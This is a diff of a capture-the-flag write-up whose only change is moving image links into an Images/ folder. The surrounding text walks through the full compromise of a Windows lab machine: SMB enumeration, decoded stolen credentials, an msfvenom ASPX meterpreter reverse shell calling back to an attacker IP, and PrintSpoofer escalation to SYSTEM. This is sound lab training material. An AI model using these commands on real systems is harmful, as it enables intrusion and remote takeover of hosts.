@@ -19,7 +19,7 @@ We start by scanning the target machine using `nmap` to identify open ports and 
 ```bash
 sudo nmap -sV -A -sS -T4 -sC 10.10.236.238
 ```
-![alt text](image-92.png)
+![alt text](Images/image-92.png)
 
 **Discovered Open Ports:**
 
@@ -31,7 +31,7 @@ sudo nmap -sV -A -sS -T4 -sC 10.10.236.238
 
 The scan reveals a web server running on **port 80**. The server uses **Microsoft HTTPAPI httpd 2.0**. Visiting the IP in a browser displays the **default Microsoft IIS page**.
 
-![alt text](image-93.png)
+![alt text](Images/image-93.png)
 
 ---
 
@@ -44,7 +44,7 @@ We attempt to find hidden web directories using `gobuster`.
 ```bash
 gobuster dir -u http://10.10.236.238 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ```
-![alt text](image-94.png)
+![alt text](Images/image-94.png)
 
 **Result:**
 No useful or interesting directories were found from the scan.
@@ -61,7 +61,7 @@ Since ports **139** and **445** are open, we proceed with SMB enumeration.
 ```bash
 smbclient -L 10.10.236.238
 ```
-![alt text](image-95.png)
+![alt text](Images/image-95.png)
 
 We discover an **unusual SMB share** named `nt4wrksv`. Let's attempt to access it.
 
@@ -70,7 +70,7 @@ We discover an **unusual SMB share** named `nt4wrksv`. Let's attempt to access i
 ```bash
 smbclient \\\\10.10.236.238\\nt4wrksv
 ```
-![alt text](image-96.png)
+![alt text](Images/image-96.png)
 
 **Inside the share**, we find a file called `passwords.txt`. We download it for local inspection.
 
@@ -85,9 +85,9 @@ We decode them to extract the plaintext credentials:
 ```bash
 echo <base64> | base64 -d
 ```
-![alt text](image-97.png)
+![alt text](Images/image-97.png)
 
-![alt text](image-98.png)
+![alt text](Images/image-98.png)
 
 We obtain credentials for **two users**:
 
@@ -107,11 +107,11 @@ We suspect there might be a known vulnerability in the SMB service. To confirm, 
 ```bash
 nmap -p 445 --script smb-vuln-* 10.10.236.238
 ```
-![alt text](image-99.png)
+![alt text](Images/image-99.png)
 
 The scan confirms that the target is **vulnerable to CVE-2017-0143**, which corresponds to **EternalBlue** (MS17-010).
 
-![alt text](image-100.png)
+![alt text](Images/image-100.png)
 
 ---
 
@@ -127,8 +127,8 @@ We attempt to exploit EternalBlue using the Metasploit Framework.
 msfconsole
 search CVE-2017-0143
 ```
-![alt text](image-104.png)
-![alt text](image-101.png)
+![alt text](Images/image-104.png)
+![alt text](Images/image-101.png)
 
 We configure the appropriate module and payload. However, the exploit **fails** due to **Inbound restrictions or mitigation in place**, meaning we cannot execute a direct shell from our attacker system.
 
@@ -147,7 +147,7 @@ We use `msfvenom` to craft a reverse shell in **ASPX format**:
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.17.103.233 LPORT=8765 -f aspx -o reverse_shell.aspx
 ```
-![alt text](image-102.png)
+![alt text](Images/image-102.png)
 
 #### 📤 Upload Reverse Shell
 
@@ -164,7 +164,7 @@ set LHOST 10.17.103.233
 set LPORT 8765
 run
 ```
-![alt text](image-103.png)
+![alt text](Images/image-103.png)
 
 #### 🧠 Trigger Payload
 
@@ -183,7 +183,7 @@ We navigate to Bob's user profile and extract the first flag:
 ```
 C:\Users\Bob\Desktop\user.txt
 ```
-![alt text](image-105.png)
+![alt text](Images/image-105.png)
 
 ✅ **User flag captured!**
 
@@ -198,7 +198,7 @@ Inside the Meterpreter session, we check privileges:
 ```bash
 getprivs
 ```
-![alt text](image-106.png)
+![alt text](Images/image-106.png)
 
 We discover the machine has the **SeImpersonatePrivilege**, which is exploitable using the **PrintSpoofer** technique.
 
@@ -210,7 +210,7 @@ We discover the machine has the **SeImpersonatePrivilege**, which is exploitable
 
 We download `PrintSpoofer64.exe` from GitHub and upload it to the same SMB share used earlier.
 
-![alt text](image-107.png)
+![alt text](Images/image-107.png)
 
 We then move to the share directory via the shell:
 
@@ -225,7 +225,7 @@ Run the following command to elevate privileges:
 ```bash
 PrintSpoofer64.exe -i -c powershell.exe
 ```
-![alt text](image-108.png)
+![alt text](Images/image-108.png)
 
 This grants a **SYSTEM-level PowerShell shell**, confirming successful privilege escalation.
 
@@ -235,14 +235,14 @@ This grants a **SYSTEM-level PowerShell shell**, confirming successful privilege
 
 Now we move to the Administrator user’s Desktop to find the root flag.
 
-![alt text](image-109.png)
+![alt text](Images/image-109.png)
 
 **Path:**
 
 ```
 C:\Users\Administrator\Desktop\root.txt
 ```
-![alt text](image-110.png)
+![alt text](Images/image-110.png)
 
 
 ✅ **Root flag captured!**
@@ -266,5 +266,6 @@ C:\Users\Administrator\Desktop\root.txt
 
 * Pwned Relevant !!!!
 
-![alt text](image-111.png)
+![alt text](Images/image-111.png)
+
 ---
